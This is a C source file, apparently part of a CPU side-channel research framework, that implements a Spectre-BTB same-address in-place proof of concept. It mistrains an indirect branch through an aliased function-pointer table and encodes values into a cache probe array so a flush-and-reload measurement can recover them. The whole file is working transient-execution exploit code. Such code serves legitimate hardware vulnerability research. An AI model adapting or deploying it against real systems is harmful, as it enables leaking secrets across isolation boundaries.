#include <stddef.h>
size_t CACHE_MISS = 0;
#include "../../../exploit_framework.h"

// BTB sa-ip: mistrain indirect branch via table aliasing

typedef void (*target_t)(void);
target_t __attribute__((aligned(4096))) table[1024];

uint8_t* probe_array;
volatile uint8_t current_encode_value;

void __attribute__((noinline)) target(void) {
    SPEC_FENCE();
    maccess(probe_array + current_encode_value * PAGE_SIZE);
}

void __attribute__((noinline)) dummy(void) {
    maccess(probe_array + 0x01 * PAGE_SIZE);
}

#ifdef P550
void __attribute__((noinline, aligned(65536))) accessor(int idx) {
    table[STALL(idx)]();
}
#else
void __attribute__((noinline)) accessor(int idx) {
    table[STALL(idx)]();
}
#endif

void btb_setup(exploit_ctx_t* ctx, void* data) {
    ctx->exclude_enabled = true;
    ctx->exclude_value = 0x01;

    table[0] = dummy;
    table[256] = target;
}

void btb_cleanup(exploit_ctx_t* ctx, void* data) {
}

void btb_attack(exploit_ctx_t* ctx, void* data, uint8_t encode_index) {
    for(int m = 0; m < 1500; m++) {
        current_encode_value = 0x01;
        mfence();
        for(int i = 0; i < 10; i++)
            accessor(256);
        current_encode_value = encode_index;
        mfence();
        accessor(0);
    }
}

int main() {
    exploit_ctx_t ctx = {0};

    if (exploit_init(&ctx) != 0) return 1;
    probe_array = ctx.probe_array;

    printf("Spectre-BTB sa-ip\n");

    exploit_hooks_t hooks = {
        .setup = btb_setup,
        .attack = btb_attack,
        .cleanup = btb_cleanup
    };

    exploit_run(&ctx, &hooks, NULL);
    exploit_print_results("BTB same-address in-place", &ctx);
    exploit_cleanup(&ctx);
    return 0;
}
